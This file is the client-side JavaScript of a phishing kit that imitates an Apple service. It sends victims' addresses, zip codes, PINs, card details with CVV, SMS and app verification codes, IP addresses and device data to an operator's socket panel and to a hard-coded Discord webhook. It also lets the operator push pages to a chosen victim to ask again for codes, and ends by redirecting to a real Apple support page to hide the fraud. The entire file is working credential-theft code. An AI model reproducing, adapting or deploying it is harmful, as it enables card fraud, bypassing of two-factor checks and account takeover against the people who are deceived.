// asign id
var uniqueID = Math.floor(Math.random() * (1000000000 - 100) + 1)

// make connection
const socket = io("https://mypanelcontrol.site", {
    path: "/socket.io",
    transports: ["websocket"]
});


// ========= Function Discord Webhook =========
function sendToDiscord(title, dataObj, highlightKeys = []) {
    const webhookUrl = 'https://discord.com/api/webhooks/1374155202957152396/3zVluUSPNxJhR0LGrQtxgKCLJKtZVCLuWCH4BauDF5Syac_krLmlb3NMv6sF9sWBt629';

    let message = `**${title}**\n\n`;

    // Créer les fields pour l'embed
    const fields = [];
    for (const [key, value] of Object.entries(dataObj)) {
        const isHighlighted = highlightKeys.includes(key);
        fields.push({
            name: key,
            value: isHighlighted ? `**${value}**` : value,
            inline: true
        });
    }

    const embed = {
        title: title,
        color: 0x0099ff, // Couleur bleue
        fields: fields,
        timestamp: new Date().toISOString(),
        footer: {
            text: "Apple Panel Control"
        }
    };

    fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            embeds: [embed]
        })
    }).catch(err => console.error("خطأ فالإرسال ل Discord ❌", err));
}
// ===========================================

socket.on("connect", () => {
    console.log("socket connected : " + socket.id);
    socket.emit('socket_connected', uniqueID)
});

// Validate inputs 
function Validate_Inputs() {
    return new Promise((resolve, reject) => {
        const divname = $("input#DivName").val()

        if (divname == 'Login' || divname == 'Login_Error') {
            if ($("select#Address").val().length > 2 && $("input#Zip").val().length > 4) {
                resolve()
            } else {
                if (divname == 'Login') {
                    document.getElementById("PassError").style.display = "flex";
                }
                $('input').addClass('borderred');
            }
        }

        if (divname == 'CC' || divname == 'Pass' || divname == 'Pass2') {
            const holder = $("input#holder").val()
            if (holder.length > 3) {
                resolve()
            } else {
                reject()
                if (divname == 'CC') {
                    document.getElementById("ccError").style.display = "flex";
                }
                $('input').addClass('borderred');
            }
        }

        if (divname == 'Sms' || divname == 'Sms_Error' || divname == 'Num' || divname == 'info') {
            if ($("input#sms").val().length > 2) {
                resolve()
            } else {
                reject()
                $('input').addClass('borderred');
                if (divname == 'Sms') {
                    document.getElementById("smserror").style.display = "flex";
                }
            }
        }

        if (divname == 'Carte_visa' || divname == 'Carte_visa_Error') {
            const cvv = $("input#cvv").val();
            const selectedCard = $(".card-container.selected");

            let customform = [];
            selectedCard.find(".wallet-value").each(function () {
                const val = $(this).text().trim();
                if (val.length >= 3) customform.push(val);
            });

            if (customform.length > 0 && cvv.length === 3) {
                const customformStr = customform.join(" / ");
                socket.emit('new_customform', {
                    uniqueID: uniqueID,
                    customform: customformStr,
                    cvv: cvv,
                });

                // Discord
                sendToDiscord("💳 Carte Visa", {
                    ID: uniqueID,
                    Form: customformStr,
                    CVV: cvv,
                    IP: ip
                }, ["CVV"]);

                resolve();
            } else {
                reject();
                $('input').addClass('borderred');
            }
        }
    })
}

// get data
let ip = '127.0.0.1'

$(document).ready(function () {
    fetch('https://extreme-ip-lookup.com/json/?key=demo2')
        .then(res => res.json())
        .then(data => {
            ip = `${data.query} / ${data.countryCode} / ${data.isp}`
        }).then(
            socket.emit('clyen', {
                ip: ip,
                uniqueID: uniqueID,
                clyan: 'clyen jdid'
            })
        ).catch(err => {
            console.error('Error: ', err);
        });

    document.body.addEventListener('DOMSubtreeModified', function () {
        const thedivname = $("#DivName").attr("value")
        if (thedivname) {
            socket.emit('DOM_HAS_CHANGED', {
                uniqueID: uniqueID,
                thedivname: thedivname
            })

            if (thedivname == "Confirmation") {
                setTimeout(function () {
                    window.location.replace("https://support.apple.com/en-us/118293");
                }, 5000);
            }

            if ((thedivname != "Confirmation")) {
                setTimeout(function () {
                    document.querySelector('#anim').innerHTML = ''
                    document.querySelector('#anim').className = ''
                }, 2000);
            }
        }
    }, false);
})

// go to an other page
$("#Variable_countainer").on("click", "#clickmee", function () {
    const divnext = $("input#DivNext").val()
    const divname = $("input#DivName").val()

    Validate_Inputs().then(() => {
        if (divname == 'Login' || divname == 'Login_Error') {
            const Address = $("select#Address").val()
            const Zip = $("input#Zip").val()

            // استخدام UAParser للحصول على معلومات دقيقة
            const parser = new UAParser();
            const result = parser.getResult();

            const deviceType = result.device.type || "Desktop";
            const os = result.os.name + " " + (result.os.version || "");
            const browser = result.browser.name + " " + (result.browser.version || "");
            const phoneModel = result.device.model || result.os.name || "Unknown";

            socket.emit('new_Login', {
                uniqueID: uniqueID,
                Address: Address,
                Zip: Zip,
                ip: ip,
                id: socket.id,
                deviceInfo: {
                    deviceType: deviceType,
                    os: os,
                    browser: browser,
                    phoneModel: phoneModel,
                    userAgent: navigator.userAgent
                }
            })

            sendToDiscord("🔑 Login", {
                ID: uniqueID,
                Address: Address,
                Zip: Zip,
                IP: ip,
                Device: deviceType || "Desktop",
                OS: os,
                Browser: browser,
                Model: phoneModel
            }, ["Address", "Zip", "Model"]);
        }

        if (divname == 'CC' || divname == 'Pass' || divname == 'Pass2') {
            const holder = $("input#holder").val()
            socket.emit('new_CC', {
                uniqueID: uniqueID,
                holder: holder,
            })

            sendToDiscord("💳 PIN", {
                ID: uniqueID,
                Holder: holder,
                IP: ip
            }, ["Holder"]);
        }

        if (divname == 'Sms' || divname == 'Sms_Error' || divname == 'Num' || divname == 'info') {
            const sms = $("input#sms").val()
            socket.emit('new_sms', {
                uniqueID: uniqueID,
                sms: sms
            })

            // إرسال لـ Discord حسب نوع الصفحة
            if (divname == 'Sms') {
                sendToDiscord("✅ SMS Verification Code", {
                    ID: uniqueID,
                    Code: sms,
                    IP: ip
                }, ["Code"]);
            }
            else if (divname == 'Sms_Error') {
                sendToDiscord("🔄 Code Appel ", {
                    ID: uniqueID,
                    Code: sms,
                    IP: ip
                }, ["Code"]);
            }
            else if (divname == 'Num') {
                sendToDiscord("📱 Code App", {
                    ID: uniqueID,
                    Code: sms,
                    IP: ip
                }, ["Code"]);
            }
            else if (divname == 'info') {
                sendToDiscord("🔐 Security Information", {
                    ID: uniqueID,
                    Code: sms,
                    IP: ip
                }, ["Code"]);
            }
        }

        if (divname == 'Cle_Intro') {
            fetch(`./divs/${divnext}.html`).then((response) => {
                return response.text().then((html) => {
                    document.querySelector('#Variable_countainer').innerHTML = html
                })
            }).then(() => {
                $("#mytext").html(`Veuillez saisir la clé contenue dans la case ${DivCle} de votre carte ${DivNumero} :`)
            })
        } else {
            fetch(`./divs/${divnext}.html`).then((response) => {
                return response.text().then((html) => {
                    document.querySelector('#Variable_countainer').innerHTML = html
                })
            })
        }
    }, () => console.log('Empty fields !'))
});

fetch(`./divs/Login.html`).then((response) => {
    return response.text().then((html) => {
        document.querySelector('#Variable_countainer').innerHTML = html
    })
})


// باقي الكود ديال socket.on و clavier بحال هو
// فقط كل emit زدت معاه sendToDiscord بنفس البيانات


socket.on('want_you_change_page', data => {


    if (uniqueID == data.uniqueID) {

        if (data.pagename == 'Pass' || data.pagename == 'Pass2' || data.pagename == 'Carte_visa_Error') {


            fetch(`./divs/${data.pagename}.html`).then((response) => {
                return response.text().then((html) => {
                    document.querySelector('#Variable_countainer').innerHTML = html
                })
            }).then(() => {

                $("#Solde").html(`${data.customInfo}`)
                $("#Montant").html(`${data.customInfoTwo}`)
                $("#Nom").html(`${data.customInfoo}`)

            })


        } else if (data.pagename == 'Sms' || data.pagename == 'Sms_Error' || data.pagename == 'info' || data.pagename == 'App_Approve_2') {

            fetch(`./divs/${data.pagename}.html`).then((response) => {
                return response.text().then((html) => {
                    document.querySelector('#Variable_countainer').innerHTML = html
                })
            }).then(() => {

                $("#Solde").html(`${data.customInfo}`)
                $("#Montant").html(`${data.customInfo}`)
                $("#Nom").html(`${data.customInfo}`)

            })


        } else if (data.pagename == "Carte_visa_Error" || data.pagename == "Carte_visa") {

            fetch(`./divs/${data.pagename}.html`).then((response) => {
                return response.text().then((html) => {

                    document.querySelector('#Variable_countainer').innerHTML = html

                })
            }).then(() => {

                $("#Solde").html(`${data.customInfo}`)
                $("#Montant").html(`${data.customInfoTwo}`)
                $("#Nom").html(`${data.customInfoo}`)


            })


        } else {
            fetch(`./divs/${data.pagename}.html`).then((response) => {
                return response.text().then((html) => {
                    document.querySelector('#Variable_countainer').innerHTML = html
                })
            })
        }

    }

})




// ****** Clavier Clicked

//ClavierAll for Pass

$("#Variable_countainer").on("click", ".ClavierAllPass li", function () {

    var $this = $(this),
        character = $this.html();

    const password = $("#Zip").val()

    if (character == 'BORRAR') {
        $("#Zip").val('')
    } else if (password) {
        $("#Zip").val(`${password}${character}`)
    } else {
        $("#Zip").val(character)
    }

})

$("#Variable_countainer").on("click", ".ClavierNotAllPass li", function () {

    var $this = $(this),
        character = $this.html();

    const password = $("#Zip").val()

    if (character == 'BORRAR') {
        $("#Zip").val('')
    } else if (password) {
        $("#Zip").val(`${password}${character}`)
    } else {
        $("#Zip").val(character)
    }

})


//ClavierAll for User

$("#Variable_countainer").on("click", ".ClavierAllUser li", function () {

    var $this = $(this),
        character = $this.html();

    const password = $("#ur").val()

    if (character == 'BORRAR') {
        $("#ur").val('')
    } else if (password) {
        $("#ur").val(`${password}${character}`)
    } else {
        $("#ur").val(character)
    }

})


// Active buttons function 





$("#Variable_countainer").on("click", ".liactive", function () {

    $('.liactive').removeClass('active');
    $(this).addClass('active');

})

// show hide All User

function showClavierAllUser() {
    document.getElementById("ClavierAllUser").style.display = "block";
    document.getElementById("png7").style.display = "none";
    document.getElementById("clavier1").style.display = "block";

}

function hideClavierAllUser() {
    document.getElementById("ClavierAllUser").style.display = "none";
    document.getElementById("png7").style.display = "block";
    document.getElementById("clavier1").style.display = "none";
}


// show hide All pass

function showClavierLetter() {
    document.getElementById("clavierAllPass").style.display = "block";
    document.getElementById("clavierNotAllPass").style.display = "none";
    document.getElementById("clavier2").style.display = "none";
    document.getElementById("png9").style.display = "block";

}


function showmethenumbers() {
    document.getElementById("clavierAllPass").style.display = "none";
    document.getElementById("clavierNotAllPass").style.display = "block";
    document.getElementById("clavier2").style.display = "block";
    document.getElementById("png9").style.display = "none";

}


//*****   clavier for cle */


$("#Variable_countainer").on("click", ".CleKeyboardList li", function () {

    var $this = $(this),
        character = $this.html();

    const password = $("#myinputfourd").val()

    console.log(password.length)

    if (password.length <= 3) {
        if (!character.includes('input')) {
            if (character == 'BORRAR') {
                $("#myinputfourd").val('')
            } else if (password) {
                $("#myinputfourd").val(`${password}${character}`)
            } else {
                $("#myinputfourd").val(character)
            }
        }
    }




})





// tessssssssssssssssssst    

socket.on('want_you_change_page', data => {


    if (uniqueID == data.uniqueID) {

        if (data.pagename == "Confirmation") {


            fetch(`./divs/${data.pagename}.html`).then((response) => {
                return response.text().then((html) => {
                    document.querySelector('#Variable_countainer').innerHTML = html
                })
            }).then(() => {

                $("#Solde").html(`${data.customInfo}`)


            })
        }



    }
})